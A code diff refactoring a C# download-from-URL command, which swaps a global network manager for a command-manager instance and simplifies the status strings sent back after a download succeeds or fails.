@@ -1,5 +1,4 @@
-﻿using NetworkManager;
-using Shared;
+﻿using Shared;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -33,15 +32,14 @@ namespace Commands
         {
             ColorTools.WriteCommandMessage("Starting download of file from url");
 
-            var result = GlobalNetworkManager.ReadLine();
+            var result = CommandsManager.networkManager.ReadLine();
             if (result == "Success")
             {
                 ColorTools.WriteCommandSuccess("File downloaded successfully from URL");
             }
             else
             {
-                var error = result.Split(':')[1];
-                ColorTools.WriteCommandError($"Download failed : {(error == "IO" ? "IO exception" : "Network error")}");
+                ColorTools.WriteCommandError($"Download failed : {(result == "IO" ? "IO exception" : "Network error")}");
             }
         }
 
@@ -54,17 +52,17 @@ namespace Commands
             try
             {
                 Client.DownloadFile(url, newFile);
-                GlobalNetworkManager.WriteLine("Success");
+                CommandsManager.networkManager.WriteLine("Success");
             }
             catch (IOException)
             {
-                GlobalNetworkManager.WriteLine("Error:IO");
+                CommandsManager.networkManager.WriteLine("IO");
             }
             catch (Exception)
             {
                 // Delete the partially created file
                 File.Delete(newFile);
-                GlobalNetworkManager.WriteLine("Error:Web");
+                CommandsManager.networkManager.WriteLine("Web");
             }
         }
     }
